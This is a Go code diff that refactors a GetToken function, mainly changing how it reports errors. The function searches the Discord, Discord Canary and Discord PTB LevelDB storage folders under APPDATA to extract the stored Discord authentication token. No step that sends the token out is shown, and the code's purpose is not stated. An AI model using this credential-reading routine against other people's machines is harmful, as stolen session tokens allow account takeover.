@@ -3,7 +3,6 @@
 package token
 
 import (
-	"github.com/pkg/errors"
 	log "github.com/sirupsen/logrus"
 	"os"
 	"path/filepath"
@@ -11,22 +10,21 @@ import (
 
 var versions = []string{"Discord", "discordcanary", "discordptb"}
 
-func GetToken() (tok string, err error) {
+func GetToken() (string, error) {
 	appdata, def := os.LookupEnv("APPDATA")
 	if !def {
-		return "", errors.New("APPDATA path wasn't specified in environment")
+		return "", ErrorNoAppdataPath
 	}
 
 	for _, ver := range versions {
 		path := filepath.Join(appdata, ver, "Local Storage/leveldb")
 		log.Debugf("Searching for LevelDB database in %v", path)
 
-		tok, err = searchLevelDB(path)
+		tok, err := searchLevelDB(path)
 		if err == nil {
-			return
+			return tok, nil
 		}
 	}
 
-	err = errors.New("Failed to retrieve token from database")
-	return
+	return "", ErrorTokenRetrieve
 }
